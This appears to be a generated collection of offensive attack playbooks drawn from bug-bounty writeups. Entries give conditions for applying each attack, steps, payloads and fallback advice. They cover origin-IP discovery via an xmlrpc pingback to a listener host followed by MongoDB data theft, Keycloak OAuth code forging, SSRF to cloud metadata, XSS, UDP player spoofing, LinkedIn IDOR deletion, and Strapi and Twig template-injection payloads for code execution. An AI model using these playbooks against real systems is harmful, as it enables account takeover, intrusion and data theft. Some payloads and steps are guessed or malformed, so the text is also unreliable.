attack_steps: Step 1: Send a `pingback` request to the target's `xmlrpc.php` endpoint containing a URL pointing to a Burp Collaborator (or similar listener) domain, disguised as a URL to ping.
Step 2: Monitor the Burp Collaborator for an incoming request, which will reveal the target's origin IP address.
Step 3: Once the origin IP is obtained, perform an Nmap scan on the IP (`nmap -p- -T4 {ORIGIN_IP}`).
Step 4: Analyze Nmap results for open ports and services.
Step 5: If MongoDB (port 27017) is found, attempt to connect to it.
Step 6: If connection is successful, use MongoDB commands (`show dbs`, `use <db_name>`, `db.<collection>.find()`) to enumerate databases and retrieve sensitive information.
Step 7: Access user tokens, OAuth state codes, and potentially PII or sensitive data from collections like `shop` or `startup_log`.
payloads_or_patterns:
XMLRPC Pingback Payload:
```xml
<?xml version="1.0" encoding="iso-8859-1"?>
<methodCall>
    <methodName>pingback.ping</methodName>
    <params>
        <param>
            <value><string>http://<BURP_COLLABORATOR_DOMAIN>/</string></value>
        </param>
        <param>
            <value><string><TARGET_URL></string></value>
        </param>
    </params>
</methodCall>
```

MongoDB Commands:
- `show dbs`
- `use shop`
- `db.startup_log.find()`
- `db.users.find()` (example, actual collection names may vary)
tools_recommended: curl: For making HTTP requests and interacting with APIs.
Nmap: For port scanning and service enumeration.
Burp Suite (or similar HTTP listener like ngrok, interactsh): To capture the callback from the SSRF and obtain the origin IP.
MongoDB Shell (`mongosh`): To interact with the discovered MongoDB instance.
success_indicators: Receiving an HTTP request in Burp Collaborator from the target's origin IP.
Successful Nmap scan revealing open ports on the origin IP.
Successful connection to the MongoDB instance.
Retrieving sensitive data such as user emails, tokens, OAuth state codes, or other PII from MongoDB collections.
failure_indicators: No callback received from Burp Collaborator after sending the pingback request (indicates `xmlrpc.php` is not functional or blocked).
Nmap scan shows no interesting ports or services.
Failure to connect to the MongoDB instance (e.g., authentication required, firewall blocking access).
MongoDB connection successful but no sensitive data found in accessible databases/collections.

playbooks.impact: Complete account takeover for all users whose data is stored in the MongoDB database, as tokens and OAuth state codes were exposed. Access to sensitive user information including emails and potentially credentials or session identifiers. Ability to impersonate users and perform actions on their behalf.
playbooks.key_lesson: Always attempt to find the origin IP behind WAFs like Cloudflare, especially when common vulnerable endpoints like WordPress's `xmlrpc.php` are present. Unsecured or poorly configured database services accessible from the origin IP can lead to severe data breaches and account takeovers.

meta.title: Vulnerability Spotlight: CVE-2023-0264

tech_stack_fingerprints: Keycloak server headers (e.g., X-Content-Type-Options: nosniff, X-Frame-Options: SAMEORIGIN)
Keycloak UI elements (e.g., login page branding)

trigger_conditions.when_to_apply: When an attacker has a valid user account and can obtain the client session ID of a target user within the same Keycloak realm.
prerequisites: Attacker must have a valid user account in the target Keycloak realm.
Attacker must be able to obtain the client session ID (the middle part of the OAuth code) of a target user.
applicability_signals: The target Keycloak instance is running a version prior to 21.0.1.
The target uses OAuth flows that are session-bound (not Device Authorization Grant).
skip_if: Keycloak instance is patched to version 21.0.1 or later.
The OAuth flow used does not generate session-bound codes (e.g., Device Authorization Grant).

recon_steps: Step 1: Identify the Keycloak version by inspecting HTTP headers or the login page.
Step 2: Confirm that the target Keycloak instance is using an OAuth flow that generates session-bound codes.
attack_steps: Step 1: Obtain the OAuth code for a target user. This might involve tricking the user into initiating a login flow or observing traffic.
Step 2: Extract the middle part (session identifier X) from the target user's OAuth code. The code format is typically `part1.part2.part3`.
Step 3: Initiate your own login process in Keycloak to generate your own valid OAuth code.
Step 4: Construct a new OAuth code by taking your code's first and third parts, and the target user's extracted middle part (session identifier X).
Step 5: Use this modified OAuth code to request an access token, effectively impersonating the target user.
payloads_or_patterns: OAuth code structure: `<your_code_part1>.<target_session_id>.<your_code_part3>`
tools_recommended: Burp Suite: To intercept and modify OAuth codes during the login flow.
Custom script: To automate the extraction and reconstruction of OAuth codes.
success_indicators: Receiving an access token that grants the attacker the same privileges as the impersonated user.
Observing user-specific data or performing actions as the impersonated user.
failure_indicators: Receiving a `BAD_REQUEST` or similar error when attempting to use the modified code. This might indicate that the session ID format or validation has changed, or that the specific OAuth flow is not vulnerable. Consider alternative methods to obtain a valid session ID or a different exploit vector.
The generated access token does not grant the expected privileges, indicating the impersonation was unsuccessful. Re-verify the extraction of the session ID and the reconstruction of the code.

playbooks.impact: An authenticated user can impersonate any other user within the same Keycloak realm, potentially leading to privilege escalation (e.g., impersonating an administrator) and unauthorized access to sensitive data or actions.
playbooks.key_lesson: Always validate the integrity of session identifiers and code parameters in authentication and authorization flows, especially when they are part of critical tokens like OAuth codes.

meta.title: How I Manipulated My Rank on the Bugcrowd Platform

trigger_conditions.when_to_apply: When an attacker can create both a researcher and a company account, and access the Bugcrowd API with valid credentials for a demo program.
prerequisites: Attacker controls a Bugcrowd researcher account.
Attacker controls a Bugcrowd company account.
Attacker can create a Demo Program and obtain API credentials from their company account.
applicability_signals: Bugcrowd API documentation is available.
The ability to create demo programs and submissions via API is present.
skip_if: API authentication fails for all requests.
Bugcrowd platform does not allow creation of demo programs or submissions via API.

recon_steps: Step 1: Review Bugcrowd API documentation to understand submission creation endpoints and required parameters.
Step 2: Identify the API endpoint for creating submissions for a bounty program.
attack_steps: Step 1: Create a demo program from the attacker's company account.
Step 2: Obtain API credentials for the demo program.

Step 3: Craft a POST request to the Bugcrowd API's submissions endpoint (`https://api.bugcrowd.com/bounties/<YOUR-BOUNTY-UUID>/submissions`) with the appropriate headers ('accept', 'authorization', 'content-type').

Step 4: In the request body, provide JSON data for a submission. This includes 'source': 'platform', 'title': 'Security Breached', 'submitted_at' (current timestamp or relevant date), 'substate': 'resolved', 'vrt_id': 'server_side_injection.remote_code_execution_rce' (or any valid vrt_id), 'priority': '1', and 'researcher_email' (the attacker's researcher account email).
Step 5: Send the request using a tool like Python's `requests` library.
Step 6: Check the email associated with the researcher account for a claimable link.
Step 7: Click the claimable link to claim the submission, which awards demo points.
Step 8: Repeat steps 3-7 multiple times to accumulate demo points.
Step 9: Observe the 'Points Total' on the submissions page to confirm the increase in demo points and their impact on the ranking algorithm.
tools_recommended: Python with 'requests' library for automating API calls.
Burp Suite for intercepting and analyzing API requests/responses.
success_indicators: API request returns a 2xx status code.
Email received with a claimable link.
Claiming the submission results in an increase in 'demo points' visible on the submissions page.
The attacker's rank on the Bugcrowd platform visibly increases in the ranking algorithm's displayed results.
failure_indicators: API request returns 4xx or 5xx status codes, indicating invalid credentials, incorrect payload, or API issues. -> Investigate API token validity, bounty UUID, and payload structure.
No claimable link received via email. -> Verify researcher email address and submission creation process.
Demo points are not awarded or do not affect the ranking. -> Confirm that demo points are indeed factored into the public ranking algorithm.

playbooks.impact: Attacker can artificially inflate their ranking on the Bugcrowd platform using demo points, potentially leading to reputational damage, loss of trust, and indirect financial benefits if the ranking is used for external validation or partnerships.
playbooks.key_lesson: Always validate the integrity of ranking algorithms and ensure that administrative or special-purpose points (like demo points) are strictly segregated and do not influence public-facing metrics that impact reputation or perceived performance.

meta.title: #BrokenSesame: Accidental ‘write’ permissions to private registry allowed potential RCE to Alibaba Cloud Database Services
meta.vuln_type: RCE | Container escape | Privilege escalation | Supply chain attack

target_profile.technology: Alibaba Cloud Database Services (ApsaraDB RDS for PostgreSQL, AnalyticDB for PostgreSQL)

trigger_conditions.when_to_apply: When an attacker has initial code execution within a containerized Alibaba Cloud Database Service instance, and the associated credentials for pulling images from the private container registry have misconfigured write permissions.
prerequisites: Attacker has achieved initial code execution within a database instance.
The containerized service uses a private container registry for image distribution.
Credentials used by the container to access the private registry have write permissions.
applicability_signals: Ability to identify the container registry used by the service.
Observation of credentials being used for registry access.
Confirmation that these credentials possess write privileges to the registry.
skip_if: Container registry access credentials do not have write permissions.
No mechanism for initial code execution within the database instance is available.

recon_steps: Step 1: Identify the containerized environment and its orchestration (e.g., Kubernetes).
Step 2: Investigate how the service pulls container images, looking for registry access credentials.
Step 3: Analyze the permissions associated with these registry access credentials.
attack_steps: Step 1: Leverage initial code execution within a compromised database instance to escape the container.
Step 2: Gain high privileges within the Kubernetes cluster by exploiting misconfigurations in container isolation and network connectivity.
Step 3: Examine the permissions of the credentials used to pull images from the Alibaba Cloud private container registry.
Step 4: If write permissions are found, craft malicious container images and upload them to the private registry.
Step 5: Trigger the service to pull the malicious image, leading to code execution on Alibaba database services (RCE).
payloads_or_patterns: Malicious container image (e.g., containing a reverse shell or backdoor).
tools_recommended: Kubernetes penetration testing tools (e.g., kube-hunter, kube-pwn)
Container image building tools (e.g., Docker, Buildah)
Network analysis tools to monitor image pulls.
success_indicators: Successful container escape and high privilege acquisition in the Kubernetes cluster.
Successful upload of a malicious image to the private container registry.
Observation of Alibaba Cloud database services pulling the malicious image.
Execution of malicious code on the target Alibaba Cloud database services.
failure_indicators: Inability to escape the container.
Registry credentials lack write permissions.
Malicious image is not pulled by the target service.
WAF or security controls prevent the execution of malicious code.

playbooks.impact: Potential Remote Code Execution (RCE) on Alibaba Cloud Database Services, allowing an attacker to compromise other tenants' data, perform a large-scale supply-chain attack, and gain control over Alibaba's infrastructure.
playbooks.key_lesson: Never grant write permissions to private container registries unless absolutely necessary, and ensure robust least-privilege access controls are in place for all service credentials.

meta.title: How Material Security Uncovered a Vulnerability in the Gmail API

trigger_conditions.when_to_apply: When the Gmail API is used to retrieve attachment content and there is a possibility of insufficient authorization checks.
prerequisites: Attacker has an authenticated Gmail or Google Workspace account.
applicability_signals: API endpoint for retrieving attachment content exists.
Authorization checks for attachment access might be weak.
skip_if: All attachment retrieval attempts for unauthorized mailboxes return explicit permission denied errors (e.g., 403 Forbidden or similar).

recon_steps: Identify the Gmail API endpoint for retrieving attachment content.
Review Gmail API documentation for attachment-related endpoints and their expected behavior regarding authorization.
attack_steps: Step 1: Authenticate to the Gmail API with a user account.
Step 2: Identify a target mailbox (potentially public or known to have attachments).
Step 3: Attempt to retrieve an attachment from the target mailbox using the identified API endpoint, without explicit permission.
Step 4: If access is granted, repeat for different mailboxes and attachments to confirm the scope of the vulnerability.
payloads_or_patterns: Use standard Gmail API calls for attachment retrieval, substituting <TARGET_EMAIL_ADDRESS> and <ATTACHMENT_ID>.
tools_recommended: Google API Client Libraries (Python, Node.js, etc.) for interacting with the Gmail API.
Burp Suite or OWASP ZAP to intercept and modify API requests.
success_indicators: Successful retrieval of attachment content from a mailbox the authenticated user does not have explicit access to.
API response containing attachment data instead of an authorization error.
failure_indicators: API returns a 401 Unauthorized or 403 Forbidden error for all attempts to access unauthorized attachments. → Pivot to testing other API endpoints for similar authorization flaws.

playbooks.impact: An attacker can access attachments from public or unauthorized Gmail/Google Workspace mailboxes, leading to unauthorized data disclosure and potential privacy breaches.
playbooks.key_lesson: Always verify that API endpoints responsible for retrieving sensitive data, like file attachments, perform robust authorization checks against the authenticated user's permissions for the specific resource.

meta.title: My First Case of SSRF Using Dirsearch

target_profile.technology: Unknown, but appears to be a web application with a proxy endpoint

trigger_conditions.when_to_apply: When a web application exposes a '/proxy.stream' endpoint that accepts an 'origin' parameter to load external resources.
prerequisites: The target must be discoverable via subdomain enumeration and directory brute-forcing tools like Dirsearch.
applicability_signals: Discovery of a '/proxy.stream' endpoint with an 'origin' parameter via Dirsearch or similar tools.
The 'origin' parameter accepts URLs and renders content from them.
skip_if: The '/proxy.stream' endpoint, if found, does not accept an 'origin' parameter.
The 'origin' parameter strictly whitelists domains and does not allow for arbitrary external URLs.
The application blocks requests to internal network IPs or cloud metadata endpoints.

recon_steps: Step 1: Enumerate subdomains of the target using 'subfinder -d <TARGET_DOMAIN>'.
Step 2: Use 'dirsearch.py -l <SUBDOMAIN_LIST_FILE> --deep-recursive' to fuzz directories and parameters, looking for endpoints like '/proxy.stream' and parameters like 'origin'.
attack_steps: Step 1: Once '/proxy.stream?origin=' is identified, construct a URL with a controlled external resource, e.g., '<TARGET_URL>/proxy.stream?origin=https://google.com'.
Step 2: Observe if the content of the external resource is rendered within the response.

Step 3: If rendering is successful, test for blind SSRF by using an Out-of-Band (OOB) interaction tool like Burp Collaborator or a self-hosted listener. Send a request to the OOB server, e.g., '<TARGET_URL>/proxy.stream?origin=<OOB_INTERACTION_URL>'.
Step 4: Attempt to access sensitive internal resources or cloud metadata endpoints. For example, try '<TARGET_URL>/proxy.stream?origin=http://169.254.169.254/latest/meta-data/' for AWS metadata.
payloads_or_patterns: <TARGET_URL>/proxy.stream?origin=https://google.com
<TARGET_URL>/proxy.stream?origin=<OOB_INTERACTION_URL>
<TARGET_URL>/proxy.stream?origin=http://169.254.169.254/latest/meta-data/
tools_recommended: Subfinder: For subdomain enumeration.
Dirsearch: For directory and parameter fuzzing, especially with the '--deep-recursive' option.
Burp Suite Collaborator (or similar OOB interaction tool): For detecting blind SSRF.
Nuclei: To create templates for automated scanning of other subdomains.
success_indicators: The response renders content from the specified 'origin' URL.
An OOB interaction (pingback) is received from the target server at the specified 'OOB_INTERACTION_URL'.
Sensitive information, such as AWS metadata credentials, is returned in the response.
failure_indicators: The target returns a 404, 403, or other error code for the '/proxy.stream' endpoint.
The 'origin' parameter is ignored or results in a generic error message.
No content is rendered, or the response indicates that the requested URL is not allowed (whitelisting).
No OOB interactions are received when attempting to trigger blind SSRF.

playbooks.impact: Potential for sensitive data disclosure (e.g., cloud credentials), internal network scanning, and in some cases, remote code execution if the SSRF can be chained with other vulnerabilities.
playbooks.key_lesson: Leverage directory brute-forcing tools with deep recursive options to uncover hidden endpoints and parameters, and always test potential SSRF sinks with OOB interaction tools and known sensitive internal endpoints.

meta.title: Popping Tags: Exploiting Template Injections in PRTG Network Monitor

tech_stack_fingerprints: PRTG Network Monitor banner in HTTP headers or HTML

trigger_conditions.when_to_apply: When the target application processes user-supplied parameters that are then used within custom templating tags, and these tags have parameters that can be manipulated.
prerequisites: The target application must be PRTG Network Monitor.
The application must be accessible without authentication.
applicability_signals: Existence of endpoints like /api/public/authdata.htm or /public/login.htm.
HTML source contains custom tags like <#system type="..." ...>.
Endpoints accept parameters that directly influence the output of these custom tags.
skip_if: No custom PRTG tags are present in the HTML source.
User-supplied parameters do not influence the output of any tags.
A Web Application Firewall (WAF) blocks all attempts to inject script tags or suspicious characters.

recon_steps: Visit the target URL and inspect the HTML source code for custom PRTG tags (e.g., <#system type='...'>).
Identify endpoints that appear to process URL parameters which might interact with these tags, such as /api/public/authdata.htm or /public/login.htm.
attack_steps: Send a GET request to an endpoint like /public/login.htm with parameters that manipulate the custom tags, e.g., `?type=defaultlogin&code=<script>alert(1)</script>`.
Observe the response for the injected script. If it is reflected directly in the HTML without encoding, XSS is possible.

If the above doesn't work, try manipulating other tags and parameters. For example, using `/api/public/authdata.htm?type=<script>alert(1)</script>` to see if the 'type' parameter is reflected unsanitized.
payloads_or_patterns: /public/login.htm?type=defaultlogin&code=<script>alert(document.domain)</script>
/api/public/authdata.htm?type=<script>alert(document.domain)</script>
tools_recommended: Burp Suite: To intercept and modify HTTP requests, and to scan responses for reflected payloads.
Browser Developer Tools: To inspect HTML source and network traffic.
success_indicators: An alert box appears with `document.domain` after visiting the crafted URL.
The injected JavaScript code is present in the HTML response, unencoded.
failure_indicators: The injected script is encoded (e.g., `<script>alert(1)</script>`) and not executed.
A 400 or 403 error is returned, indicating input validation or a WAF.
No reflection of the injected payload is observed in the response.

playbooks.impact: Execution of arbitrary JavaScript in the context of the victim's browser when they visit the vulnerable URL. This can lead to session hijacking, data theft, or further attacks.
playbooks.key_lesson: Always test how user-supplied parameters are processed within custom templating engines or bespoke tag systems by injecting script payloads to detect Reflected XSS.

meta.title: Impersonating Other Players with UDP Spoofing in Mirror

tech_stack_fingerprints: Mirror KCP packet structure observed in network traffic

trigger_conditions.when_to_apply: When the target game uses the Mirror networking framework with its default KCP (UDP) transport, and commands are used for client-server interactions.
prerequisites: Attacker has network visibility to capture UDP packets sent by the game.
Attacker can identify valid `sn` (sequence number) values for spoofed packets.
applicability_signals: Network traffic reveals KCP packets with Mirror-specific headers and message types.
Analysis of game logic shows client-invoked commands on player objects.
The KCP transport is identified as the default or explicitly configured transport.
skip_if: Target uses a different transport (e.g., WebSocket, TCP) where UDP spoofing is not applicable.
Strong network ingress filtering prevents UDP spoofing.
Game logic heavily relies on server-side validation that cannot be bypassed by spoofing.

recon_steps: Step 1: Capture network traffic during normal gameplay using Wireshark or similar tools.
Step 2: Analyze captured UDP packets to identify the KCP packet structure and relevant fields like `sn` (sequence number), `netId`, `componentIndex`, `functionHash`, and `data`.
Step 3: Reverse engineer or analyze the game's source code (if available) to understand the hashing mechanism for `messageTypeId` and `functionHash`, and the structure of `Mirror.CommandMessage`.
attack_steps: Step 1: Identify the target player object's `netId` and the target component's `componentIndex`.
Step 2: Determine the `functionHash` for the desired command (e.g., `Player::ConsumePotion`).
Step 3: Construct a spoofed UDP packet mimicking the KCP and Mirror `CommandMessage` structure.
Step 4: For the `sn` field, start with 0 and increment for each subsequent spoofed packet, or attempt to observe a legitimate sequence number from target traffic and spoof subsequent values.
Step 5: Send the crafted UDP packet with a spoofed source IP address (to match the victim player) to the game server.
Step 6: Observe the server's reaction or game state changes.
payloads_or_patterns: Constructed UDP packet with KCP header, Mirror header, `Mirror.CommandMessage` structure, including: `netId`, `componentIndex`, `functionHash`, `dataLen`, `data`.
The `sn` field needs to be managed sequentially or by observing legitimate traffic.
tools_recommended: Wireshark: For capturing and analyzing UDP network traffic.
010 Editor: For detailed packet analysis and manipulation.
Custom UDP packet crafting tool/script (e.g., using Python's `scapy` library): To construct and send spoofed UDP packets.
Burp Suite (if applicable to proxy game traffic): For intercepting and modifying outgoing client traffic for analysis.
success_indicators: The game server executes the command on behalf of the spoofed player.
Observable game state changes consistent with the executed command (e.g., victim player's inventory changes, stats are altered, actions are performed without their input).
failure_indicators: Packet is dropped by the server (no observable change).
Server responds with an error related to sequence number mismatch or invalid message.
400 Bad Request or similar error if the packet structure is malformed.
If failure, try enumerating `sn` values or observing more traffic to determine the correct sequence.

playbooks.impact: An attacker can impersonate other players by sending spoofed UDP packets to the game server, causing them to execute commands as if they were the victim. This could lead to denial of service, manipulation of game state, or unauthorized actions on behalf of other players.
playbooks.key_lesson: When using UDP transports in game networking, ensure robust authentication and validation beyond sequence numbers to prevent packet spoofing and impersonation.

meta.title: Responsible Disclosure: How we could have deleted any Linkedin post

trigger_conditions.when_to_apply: When an authenticated user can delete their own media or posts via an API endpoint that does not properly validate ownership.
prerequisites: Attacker must have a LinkedIn account.
Target user must have media or posts that can be deleted via API.
applicability_signals: Existence of API endpoints for deleting media or posts.
API endpoints that take an ID as a parameter for deletion.
Responses containing media IDs or post IDs in JSON format.
skip_if: API endpoints consistently return 403 Forbidden or 401 Unauthorized when attempting to delete media/posts not owned by the authenticated user.

recon_steps: Step 1: Authenticate to LinkedIn with a test account and observe network traffic during actions like uploading media or creating posts.
Step 2: Identify API endpoints responsible for managing media (e.g., deletion) and posts (e.g., deletion) using browser developer tools or a proxy like Burp Suite.
Step 3: Analyze requests and responses for patterns related to media IDs and post IDs, noting their format (e.g., numeric, UUID).
attack_steps: Step 1: Upload a piece of media or create a post using the attacker's authenticated account.
Step 2: Capture the request to delete this media/post and note the endpoint and any relevant IDs (e.g., mediaId, postId).

Step 3: Attempt to delete media/posts belonging to other users by replacing the captured ID with a known ID of another user's media/post. This can be done by observing public profiles or by having access to a victim account (e.g., via a previous exploit).
Step 4: Observe the HTTP status code and response body for any indications of success or failure.
payloads_or_patterns: DELETE /rest/media/<TARGET_MEDIA_ID>
DELETE /rest/posts/<TARGET_POST_ID>
tools_recommended: Burp Suite: To intercept and modify HTTP requests, specifically the DELETE requests to the identified endpoints.
Browser Developer Tools: To observe network traffic and identify API endpoints and IDs.
success_indicators: HTTP 200 OK or HTTP 204 No Content status code for the DELETE request targeting another user's media/post.
Verification on the target's profile that the media or post is no longer visible.
failure_indicators: HTTP 403 Forbidden or 401 Unauthorized response when attempting to delete another user's content. This indicates proper authorization checks are in place.
HTTP 404 Not Found response could indicate an invalid ID, but might also be used to mask authorization failures. Further investigation with known valid IDs is needed.

playbooks.impact: An authenticated attacker can delete any user's posts or media on LinkedIn, leading to content removal and potential reputational damage for the victim.
playbooks.key_lesson: Always validate ownership of resources before allowing deletion via API endpoints, even for authenticated users.

meta.title: How to narrow recon giving me $$$$ Bounty

trigger_conditions.when_to_apply: This technique is applicable when an API endpoint, particularly one handling user-specific data or sensitive information, is discoverable via fuzzing and exhibits caching behavior that can be manipulated to serve cached responses to other users.
prerequisites: The target application must use a caching mechanism.
An authenticated session is required to access the sensitive endpoint.
applicability_signals: GraphQL POST requests are observed for most API interactions.
A /api/auth/csrf endpoint exists.
Fuzzing reveals an endpoint like /api/auth/FUZZ that returns sensitive information.
skip_if: The target application does not appear to use any form of caching.
All discovered endpoints require administrative privileges.

recon_steps: Step 1: Browse the web application extensively to populate Burp Suite history and identify all API endpoints, noting the HTTP methods and parameters used.
Step 2: Identify any endpoints that are called periodically (e.g., every 60 minutes) for CSRF tokens or other regular updates.
Step 3: Begin fuzzing potential sensitive endpoints (e.g., /api/auth/FUZZ) using a wordlist to discover endpoints that return user-specific data.
attack_steps: Step 1: Identify a sensitive endpoint (e.g., /api/auth/FUZZ) that returns user information and is prone to caching.
Step 2: Craft a request to the identified sensitive endpoint using your authenticated session.
Step 3: Analyze the response to confirm it contains sensitive user data.

Step 4: If the endpoint is cacheable, attempt to exploit Web Cache Deception by manipulating cache-related headers or parameters in conjunction with the sensitive endpoint request. The writeup implies this step was performed but lacks specific details on how the cache was manipulated.
payloads_or_patterns:
POST /api/auth/graphql HTTP/1.1
Host: <TARGET_URL>
Content-Type: application/json

{ "query": "{ user(id: \"<USER_ID>\") { email, apiKey } }" }
tools_recommended: Burp Suite: For proxying traffic, identifying endpoints, and fuzzing.
Custom scripts: For automating requests and analyzing responses.
success_indicators: Receiving sensitive information (e.g., email addresses, API keys) of other users in the response.
The response is served from cache, allowing access to data without direct authentication to other users' accounts.
failure_indicators: Responses consistently require valid authentication for each request and are not served from cache.
403 Forbidden or other access control errors when attempting to access sensitive data.
Fuzzing does not reveal any endpoints that return sensitive information.

playbooks.impact: Unauthorized access to all user information, including API keys, allowing attackers to impersonate users or misuse their API credentials.
playbooks.key_lesson: Fuzzing API endpoints for sensitive data and understanding caching behavior can lead to critical vulnerabilities like Web Cache Deception, even in modern applications using GraphQL.

meta.title: Multiple Critical Vulnerabilities In Strapi Versions <=4.7.1

tech_stack_fingerprints: Shodan search for Strapi servers returns over 19,000 results

trigger_conditions.when_to_apply: This playbook is applicable to Strapi versions less than or equal to 4.7.1, particularly when the AWS Cognito login provider is enabled and email templates are used for notifications.
prerequisites: Target Strapi version <= 4.7.1
AWS Cognito login provider is configured (CVE-2023-22893 prerequisite for chaining)
Email templates are utilized (CVE-2023-22621 prerequisite for chaining)
applicability_signals: Presence of /api/connect/aws-cognito endpoint
Usage of email templates for password resets or notifications
Strapi version banner or response headers indicating a vulnerable version
skip_if: Strapi version is >= 4.8.0
AWS Cognito login provider is not enabled
Email templates are not in use or are properly sanitized

recon_steps: Step 1: Identify the Strapi version by inspecting HTTP response headers or HTML source code.
Step 2: If a vulnerable version is detected, check for the presence of the AWS Cognito login provider configuration in the Strapi admin panel or by observing login options.
Step 3: Confirm if email templates are configured and in use by triggering a password reset or notification that uses email.
attack_steps: Step 1: Exploit CVE-2023-22893 (Authentication Bypass for AWS Cognito Login Provider) to gain administrator access. This typically involves manipulating the AWS Cognito login flow.
Step 2: Once authenticated as an administrator, access the Email Templates section.

Step 3: Exploit CVE-2023-22621 (SSTI to RCE by Exploiting Email Templates). Craft a malicious payload within an email template that leverages Server-Side Template Injection (SSTI) to achieve Remote Code Execution (RCE). This may involve using Lodash template syntax and bypassing validation checks.

Step 4: (Optional, for full chain) Exploit CVE-2023-22894 (Leaking Sensitive User Information by Filtering on Private Fields) to gain further insights or escalate privileges if RCE is not directly achievable or to steal sensitive user data.
payloads_or_patterns: Payload for CVE-2023-22621 (SSTI): Example might involve something like `<% _.templateSettings.imports.require('child_process').execSync('id') %>` or similar, tailored to bypass specific filters.
Exploitation of AWS Cognito authentication bypass likely involves crafting specific POST requests to the Cognito login endpoint with manipulated parameters.
tools_recommended: Burp Suite: For intercepting and modifying HTTP requests, especially when targeting the Cognito login flow and email template submissions.
Custom scripts: To automate the chaining of the vulnerabilities, particularly for exploiting the AWS Cognito authentication bypass and then the SSTI.
success_indicators: Successful bypass of AWS Cognito authentication, granting administrative access.
Response indicating successful template rendering with executed command output (e.g., `uid=...`, `gid=...` from `id` command).
Receipt of a reverse shell or execution of arbitrary commands on the server.
Access to sensitive user data or administrator credentials through CVE-2023-22894.
failure_indicators: AWS Cognito login consistently requires valid credentials and does not allow bypass.
Email template rendering does not execute arbitrary code, indicating proper sanitization or lack of SSTI vulnerability.
403 Forbidden or similar errors when attempting to access sensitive fields.
Server responses indicate invalid template syntax or lack of vulnerability.

playbooks.impact: Unauthenticated Remote Code Execution (RCE) on the Strapi server. This allows an attacker to gain full control of the server, steal sensitive data, deploy malware, or use it as a pivot point for further attacks. It also includes the ability to bypass authentication and access administrative functions, and leak sensitive user information.
playbooks.key_lesson: Always chain vulnerabilities, especially when multiple are present in a system. Even if individual vulnerabilities seem limited, their combination can lead to critical impacts like unauthenticated RCE.

meta.title: Shopware 6 Server-side Template Injection (SSTI) via Twig Security Extension

affected_components: Twig templating engine with SecurityExtension (shopware/core, shopware/platform)

trigger_conditions.when_to_apply: This vulnerability is applicable when an attacker has authenticated access to the Shopware Admin panel and can influence Twig template rendering without the Sandbox extension being enforced, specifically when the `SecurityExtension` validation can be bypassed.
prerequisites: Attacker has authenticated access to the Shopware Admin panel.
applicability_signals: The target is using Shopware version v6.4.18.1 <= v6.4.20.0 or v6.5.0.0-rc1 <= v6.5.0.0-rc4.
The possibility to inject data that will be rendered by Twig templates.
skip_if: Shopware is updated to v6.4.20.1 or later.
The Twig environment strictly enforces the Sandbox extension, preventing bypass of `SecurityExtension`.

recon_steps: Step 1: Identify Shopware version used by the target.
Step 2: Confirm if authenticated access to the Admin panel is possible.
attack_steps: Step 1: Craft a Twig template payload that leverages the bypass in `SecurityExtension` by passing a callable as an array.
Step 2: Inject the payload into an area where it will be rendered by Twig, such as through theme customization or an extension that allows template modification.
Step 3: Observe the server's response for signs of arbitrary code execution.
payloads_or_patterns:
Payload template for RCE via Twig SSTI bypass:
`{{ _self.parent.template.getChildren()|filter((c) => const(\'system\', \'exec\', \'ls /\') ) }}`
